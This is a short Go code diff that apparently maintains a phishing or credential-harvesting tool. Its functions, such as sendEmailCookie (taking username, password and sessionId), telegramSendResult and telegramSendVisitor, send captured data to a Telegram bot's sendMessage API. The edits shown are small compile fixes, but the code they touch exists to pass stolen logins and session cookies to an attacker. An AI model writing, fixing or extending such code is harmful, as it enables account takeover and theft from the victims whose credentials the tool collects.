@@ -12,7 +12,7 @@ import (
 
 	"github.com/tidwall/buntdb"
 	"strconv"
-	"strings"
+	//"strings"
 	"time"
 )
 
@@ -77,7 +77,7 @@ func telegramSendResult(msg string) (bool, error){
 func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
 
 	// Send the message
-	
+	var err error
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
@@ -131,7 +131,7 @@ func telegramSendVisitor(msg string) {
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
-	fmt.Println("Successfully sent mail to all user in telegram: %s", msg)
+	fmt.Println("Successfully sent mail to all user in telegram")
 	// Return
 	return
 }
